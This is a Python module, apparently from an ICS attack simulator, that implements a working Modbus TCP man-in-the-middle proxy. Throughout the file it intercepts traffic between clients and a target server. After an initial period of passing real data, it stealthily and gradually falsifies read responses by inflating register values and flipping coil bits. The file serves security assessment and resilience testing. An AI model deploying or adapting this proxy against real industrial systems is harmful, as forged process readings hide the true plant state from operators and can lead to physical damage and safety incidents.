"""
Modbus MITM Proxy module for ADCyder Attack Simulator.

This module implements a Man-in-the-Middle proxy server for intercepting,
modifying, and forwarding Modbus TCP traffic during attack simulations.

Key Features:
- Transparent proxy for Modbus TCP protocol (port 502)
- Real-time traffic interception and modification
- Gradual transition from authentic to synthetic data
- Configurable data manipulation strategies
- Connection management and error handling

Attack Capabilities:
- Data integrity attacks through value manipulation
- Stealth operations with gradual data transitions
- Protocol-aware packet inspection and modification
- Multi-client connection support
- Logging and monitoring of intercepted traffic

Use Cases:
- ICS/SCADA security assessment
- Modbus protocol vulnerability testing
- Data integrity attack simulation
- Industrial control system resilience testing
- Network security validation
"""

import asyncio
import logging
import socket
import struct
import time

from typing import Optional, Dict, Any

from controller.settings import (
    MODBUS_PROXY_PORT,
    MODBUS_TARGET_PORT,
    AGGREGATOR_IP_ADDRESS,
)


class ModbusFrame:
    """
    Represents a Modbus TCP frame for parsing and manipulation.

    Modbus TCP frame structure:
    - Transaction ID (2 bytes)
    - Protocol ID (2 bytes, always 0x0000 for Modbus TCP)
    - Length (2 bytes)
    - Unit ID (1 byte)
    - Function Code (1 byte)
    - Data (variable length)
    """

    def __init__(self, data: bytes) -> None:
        """Initialize Modbus frame from raw bytes."""
        self.raw_data = data
        self.transaction_id: int = 0
        self.protocol_id: int = 0
        self.length: int = 0
        self.unit_id: int = 0
        self.function_code: int = 0
        self.data: bytes = b""
        self.is_valid = False

        self._parse_frame()

    def _parse_frame(self) -> None:
        """Parse the raw Modbus TCP frame."""
        try:
            if len(self.raw_data) < 8:  # Minimum Modbus TCP frame size
                return

            # Parse Modbus TCP header
            self.transaction_id = struct.unpack(">H", self.raw_data[0:2])[0]
            self.protocol_id = struct.unpack(">H", self.raw_data[2:4])[0]
            self.length = struct.unpack(">H", self.raw_data[4:6])[0]
            self.unit_id = struct.unpack("B", self.raw_data[6:7])[0]
            self.function_code = struct.unpack("B", self.raw_data[7:8])[0]

            # Extract data portion
            if len(self.raw_data) >= 8 + self.length - 2:
                self.data = self.raw_data[8 : 8 + self.length - 2]
                self.is_valid = True

        except (struct.error, IndexError) as e:
            logging.warning(f"Failed to parse Modbus frame: {e}")
            self.is_valid = False

    def to_bytes(self) -> bytes:
        """Convert the frame back to bytes."""
        if not self.is_valid:
            return self.raw_data

        # Recalculate length
        self.length = len(self.data) + 2  # Unit ID + Function Code

        # Pack the frame
        header = struct.pack(
            ">HHHBB",
            self.transaction_id,
            self.protocol_id,
            self.length,
            self.unit_id,
            self.function_code,
        )

        return header + self.data

    def is_read_request(self) -> bool:
        """Check if this is a read request (function codes 1-4)."""
        return self.function_code in [1, 2, 3, 4]

    def is_read_response(self) -> bool:
        """Check if this is a read response."""
        return self.is_read_request() and len(self.data) > 0


class ModbusMITMProxy:
    """
    Modbus Man-in-the-Middle proxy server.

    This proxy intercepts Modbus TCP traffic, allowing for real-time
    monitoring and manipulation of industrial control communications.
    """

    def __init__(
        self,
        listen_port: int = MODBUS_PROXY_PORT,
        target_host: str = str(AGGREGATOR_IP_ADDRESS),
        target_port: int = MODBUS_TARGET_PORT,
    ) -> None:
        """Initialize the Modbus MITM proxy."""
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port

        self.server: Optional[asyncio.Server] = None
        self.is_running = False
        self.start_time = time.time()
        self.transition_start_time: Optional[float] = None
        self.transition_duration = 30.0  # 30-second gradual transition
        self.initial_period = 60.0  # 60 seconds of authentic data

        # Connection tracking
        self.active_connections: Dict[str, Any] = {}
        self.connection_counter = 0

        # Data manipulation state
        self.authentic_data_cache: Dict[str, bytes] = {}
        self.synthetic_data_enabled = False

        logging.info(
            f"Modbus MITM Proxy initialized: {listen_port} -> {target_host}:{target_port}"
        )

    async def start_server(self) -> None:
        """Start the proxy server."""
        try:
            self.server = await asyncio.start_server(
                self._handle_client_connection, "0.0.0.0", self.listen_port
            )

            self.is_running = True
            self.start_time = time.time()

            logging.info(f"Modbus MITM Proxy listening on port {self.listen_port}")

            # Schedule transition to synthetic data after initial period
            asyncio.create_task(self._schedule_data_transition())

            async with self.server:
                await self.server.serve_forever()

        except Exception as e:
            logging.error(f"Failed to start Modbus MITM Proxy: {e}")
            raise

    async def stop_server(self) -> None:
        """Stop the proxy server."""
        if self.server:
            self.server.close()
            await self.server.wait_closed()
            self.is_running = False
            logging.info("Modbus MITM Proxy stopped")

    async def _schedule_data_transition(self) -> None:
        """Schedule the transition from authentic to synthetic data."""
        try:
            # Wait for initial period with authentic data
            await asyncio.sleep(self.initial_period)

            logging.info("Starting transition from authentic to synthetic data")
            self.transition_start_time = time.time()
            self.synthetic_data_enabled = True

        except asyncio.CancelledError:
            logging.info("Data transition scheduling cancelled")

    async def _handle_client_connection(
        self, client_reader: asyncio.StreamReader, client_writer: asyncio.StreamWriter
    ) -> None:
        """Handle a new client connection."""
        client_addr = client_writer.get_extra_info("peername")
        connection_id = f"conn_{self.connection_counter}"
        self.connection_counter += 1

        logging.info(f"New client connection {connection_id} from {client_addr}")

        target_reader: Optional[asyncio.StreamReader] = None
        target_writer: Optional[asyncio.StreamWriter] = None

        try:
            # Establish connection to target Modbus server
            target_reader, target_writer = await asyncio.open_connection(
                self.target_host, self.target_port
            )

            logging.info(f"Connected to target Modbus server for {connection_id}")

            # Store connection info
            self.active_connections[connection_id] = {
                "client_addr": client_addr,
                "start_time": time.time(),
                "packets_intercepted": 0,
            }

            # Create bidirectional data forwarding tasks
            client_to_target = asyncio.create_task(
                self._forward_data(
                    client_reader,
                    target_writer,
                    f"{connection_id}_client_to_target",
                    True,
                )
            )

            target_to_client = asyncio.create_task(
                self._forward_data(
                    target_reader,
                    client_writer,
                    f"{connection_id}_target_to_client",
                    False,
                )
            )

            # Wait for either direction to complete
            done, pending = await asyncio.wait(
                [client_to_target, target_to_client],
                return_when=asyncio.FIRST_COMPLETED,
            )

            # Cancel remaining tasks
            for task in pending:
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass

        except Exception as e:
            logging.error(f"Error handling connection {connection_id}: {e}")

        finally:
            # Cleanup connections
            try:
                client_writer.close()
                await client_writer.wait_closed()
            except Exception:
                pass

            if target_writer:
                try:
                    target_writer.close()
                    await target_writer.wait_closed()
                except Exception:
                    pass

            # Remove from active connections
            if connection_id in self.active_connections:
                del self.active_connections[connection_id]

            logging.info(f"Connection {connection_id} closed")

    async def _forward_data(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        direction: str,
        is_client_to_target: bool,
    ) -> None:
        """Forward data between client and target with optional manipulation."""
        try:
            while True:
                data = await reader.read(4096)
                if not data:
                    break

                # Process and potentially modify the data
                modified_data = await self._process_modbus_data(
                    data, is_client_to_target
                )

                # Forward the (potentially modified) data
                writer.write(modified_data)
                await writer.drain()

                # Update statistics
                connection_id = direction.split("_")[0] + "_" + direction.split("_")[1]
                if connection_id in self.active_connections:
                    self.active_connections[connection_id]["packets_intercepted"] += 1

        except asyncio.CancelledError:
            pass
        except Exception as e:
            logging.error(f"Error in data forwarding ({direction}): {e}")

    async def _process_modbus_data(
        self, data: bytes, is_client_to_target: bool
    ) -> bytes:
        """Process and potentially modify Modbus data."""
        try:
            # Parse Modbus frame
            frame = ModbusFrame(data)

            if not frame.is_valid:
                return data  # Forward unmodified if not valid Modbus

            # Log the intercepted frame
            direction = "Client->Target" if is_client_to_target else "Target->Client"
            logging.debug(
                f"Intercepted Modbus frame ({direction}): "
                f"TxID={frame.transaction_id}, FC={frame.function_code}"
            )

            # Handle data manipulation for responses (target to client)
            if not is_client_to_target and frame.is_read_response():
                return await self._manipulate_response_data(frame)

            # Cache authentic data for future synthesis
            if not is_client_to_target and frame.is_read_response():
                cache_key = f"fc_{frame.function_code}_tx_{frame.transaction_id}"
                self.authentic_data_cache[cache_key] = data

            return data  # Forward unmodified

        except Exception as e:
            logging.warning(f"Error processing Modbus data: {e}")
            return data  # Forward unmodified on error

    async def _manipulate_response_data(self, frame: ModbusFrame) -> bytes:
        """Manipulate Modbus response data based on attack strategy."""
        if not self.synthetic_data_enabled:
            return frame.to_bytes()  # Return authentic data during initial period

        try:
            # Calculate transition progress (0.0 = authentic, 1.0 = fully synthetic)
            transition_progress = self._calculate_transition_progress()

            if transition_progress <= 0.0:
                return frame.to_bytes()  # Still in authentic phase

            # Generate synthetic data based on function code
            if frame.function_code == 3:  # Read Holding Registers
                return await self._synthesize_holding_registers(
                    frame, transition_progress
                )
            elif frame.function_code == 4:  # Read Input Registers
                return await self._synthesize_input_registers(
                    frame, transition_progress
                )
            elif frame.function_code in [1, 2]:  # Read Coils/Discrete Inputs
                return await self._synthesize_discrete_values(
                    frame, transition_progress
                )

            return frame.to_bytes()  # Default: return unmodified

        except Exception as e:
            logging.warning(f"Error manipulating response data: {e}")
            return frame.to_bytes()

    def _calculate_transition_progress(self) -> float:
        """Calculate the progress of transition from authentic to synthetic data."""
        if not self.transition_start_time:
            return 0.0

        elapsed = time.time() - self.transition_start_time
        progress = min(elapsed / self.transition_duration, 1.0)
        return progress

    async def _synthesize_holding_registers(
        self, frame: ModbusFrame, progress: float
    ) -> bytes:
        """Synthesize holding register data with gradual transition."""
        try:
            if len(frame.data) < 3:  # Need at least byte count + 2 bytes of data
                return frame.to_bytes()

            byte_count = frame.data[0]
            register_data = frame.data[1 : 1 + byte_count]

            # Create synthetic data by gradually modifying values
            synthetic_data = bytearray(register_data)

            for i in range(0, len(synthetic_data), 2):
                if i + 1 < len(synthetic_data):
                    # Extract 16-bit register value
                    original_value = struct.unpack(">H", synthetic_data[i : i + 2])[0]

                    # Apply gradual modification (example: increase by up to 20%)
                    modification_factor = 1.0 + (0.2 * progress)
                    synthetic_value = int(original_value * modification_factor)
                    synthetic_value = min(synthetic_value, 65535)  # Clamp to 16-bit

                    # Pack back into bytes
                    synthetic_data[i : i + 2] = struct.pack(">H", synthetic_value)

            # Reconstruct frame with synthetic data
            frame.data = bytes([byte_count]) + bytes(synthetic_data)

            logging.debug(
                f"Synthesized holding registers with {progress:.2%} transition"
            )
            return frame.to_bytes()

        except Exception as e:
            logging.warning(f"Error synthesizing holding registers: {e}")
            return frame.to_bytes()

    async def _synthesize_input_registers(
        self, frame: ModbusFrame, progress: float
    ) -> bytes:
        """Synthesize input register data with gradual transition."""
        # Similar to holding registers but for input registers
        return await self._synthesize_holding_registers(frame, progress)

    async def _synthesize_discrete_values(
        self, frame: ModbusFrame, progress: float
    ) -> bytes:
        """Synthesize discrete input/coil data with gradual transition."""
        try:
            if len(frame.data) < 2:  # Need at least byte count + 1 byte of data
                return frame.to_bytes()

            byte_count = frame.data[0]
            discrete_data = frame.data[1 : 1 + byte_count]

            # Gradually flip bits based on transition progress
            synthetic_data = bytearray(discrete_data)

            for i, byte_val in enumerate(synthetic_data):
                # Flip bits probabilistically based on progress
                if progress > 0.5:  # Start flipping bits after 50% transition
                    flip_probability = (progress - 0.5) * 2.0  # 0.0 to 1.0
                    if (
                        hash(f"{i}_{int(time.time() / 10)}") % 100
                        < flip_probability * 10
                    ):
                        synthetic_data[i] = byte_val ^ 0xFF  # Flip all bits

            # Reconstruct frame
            frame.data = bytes([byte_count]) + bytes(synthetic_data)

            logging.debug(f"Synthesized discrete values with {progress:.2%} transition")
            return frame.to_bytes()

        except Exception as e:
            logging.warning(f"Error synthesizing discrete values: {e}")
            return frame.to_bytes()

    def get_status(self) -> Dict[str, Any]:
        """Get current proxy status and statistics."""
        uptime = time.time() - self.start_time if self.is_running else 0
        transition_progress = self._calculate_transition_progress()

        return {
            "is_running": self.is_running,
            "uptime_seconds": uptime,
            "listen_port": self.listen_port,
            "target_host": self.target_host,
            "target_port": self.target_port,
            "active_connections": len(self.active_connections),
            "synthetic_data_enabled": self.synthetic_data_enabled,
            "transition_progress": transition_progress,
            "authentic_data_cached": len(self.authentic_data_cache),
        }


async def run_modbus_proxy(
    listen_port: int = MODBUS_PROXY_PORT,
    target_host: str = str(AGGREGATOR_IP_ADDRESS),
    target_port: int = MODBUS_TARGET_PORT,
) -> None:
    """Run the Modbus MITM proxy server."""
    proxy = ModbusMITMProxy(listen_port, target_host, target_port)

    try:
        await proxy.start_server()
    except KeyboardInterrupt:
        logging.info("Received interrupt signal, stopping proxy...")
    finally:
        await proxy.stop_server()


if __name__ == "__main__":
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )

    # Run the proxy
    asyncio.run(run_modbus_proxy())
